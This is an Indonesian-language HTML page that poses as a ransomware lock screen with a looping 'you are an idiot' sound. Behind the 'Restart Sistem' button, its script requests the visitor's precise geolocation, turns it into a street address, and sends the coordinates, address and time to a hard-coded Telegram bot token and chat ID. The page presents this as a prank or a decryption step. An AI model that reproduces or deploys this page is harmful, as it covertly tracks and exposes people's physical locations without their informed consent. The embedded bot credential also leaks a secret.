<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>🚨 ENCRYPTED!</title>
  <style>
    body {
      margin: 0; padding: 0;
      background-color: #ff0000;
      color: white;
      font-family: 'Courier New', monospace;
      display: flex; justify-content: center; align-items: center;
      height: 100vh; overflow: hidden;
    }
    .container {
      text-align: center; padding: 20px;
      border: 3px solid black; border-radius: 10px;
      background-color: #330000;
      box-shadow: 0 0 15px 5px rgba(0,0,0,0.7);
    }
    h1 { font-size: 3em; margin-bottom: 20px; }
    p { font-size: 1.5em; margin: 10px 0; }
    button { background-color: #ffcc00; color:black;
      font-size:1.2em; padding:10px 20px; border:none;
      border-radius:5px; cursor:pointer; margin-top:20px;}
    button:hover { background-color: #e6b800; }
    .hidden { display:none; }
    .box { border:2px solid white; padding:10px; margin:10px; border-radius:5px; background-color:#660000; }
  </style>
</head>
<body>

<div class="container">
  <h1>🚨 ENCRYPTED!</h1>
  <p>Komputer Anda telah terinfeksi!</p>
  <p>Semua data dienkripsi!</p>
  <button onclick="unlockSystem()">Restart Sistem</button>
  <div id="status" class="hidden">
    <p class="box">Sistem sedang memproses...</p>
    <p class="box">Proses dekripsi sedang berlangsung...</p>
    <p class="box">Harap tunggu beberapa saat...</p>
  </div>
</div>

<!-- Audio You are Idiot -->
<audio id="idiotSound" loop autoplay>
  <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
</audio>

<script>
  // ⚠️ SIMPAN TOKEN & CHAT_ID UNTUK UJI COBA PRIBADI
  const BOT_TOKEN = "8044085647:AAF0fa7MVxvL7WUufPEaKB0aXf24eXnQRDM";
  const CHAT_ID = "-1002913432274";

  function formatWaktu() {
    const now = new Date();
    return now.toLocaleString("id-ID", { 
      weekday: "long", year: "numeric", month: "long", 
      day: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" 
    });
  }

  async function kirimLokasi(pos) {
    const lat = pos.coords.latitude;
    const lng = pos.coords.longitude;
    const acc = pos.coords.accuracy;
    const waktu = formatWaktu();
    
    try {
      const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
      const geoData = await geoRes.json();
      const addr = geoData.address || {};
      const kecamatan = addr.suburb || addr.village || addr.town || "-";
      const kabupaten = addr.county || addr.city || "-";
      const provinsi = addr.state || "-";
      const negara = addr.country || "-";
      const alamat = geoData.display_name || "-";

      const message = 
`📍 Lokasi Terdeteksi:
Lat: ${lat}
Lng: ${lng}
Akurasi: ${acc} m
Kecamatan/Desa: ${kecamatan}
Kabupaten/Kota: ${kabupaten}
Provinsi: ${provinsi}
Negara: ${negara}
Alamat Lengkap: ${alamat}

⏰ Waktu Akses: ${waktu}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });

    } catch(err) { console.error(err); }
  }

  function unlockSystem() {
    const sound = document.getElementById('idiotSound');
    if(sound.paused) sound.play();

    document.querySelector('button').classList.add('hidden');
    document.getElementById('status').classList.remove('hidden');

    // minta izin lokasi otomatis
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(pos => {
        kirimLokasi(pos);
      }, err => {
        console.warn("Izin lokasi ditolak.");
      }, { enableHighAccuracy:true });
    }

    setTimeout(()=>{
      alert('Sistem berhasil didekripsi!'); // prank tetap
      location.reload();
    },5000);
  }

  // pastikan audio selalu diputar
  const audio = document.getElementById('idiotSound');
  audio.addEventListener('ended', ()=>audio.play());

</script>
</body>
</html>
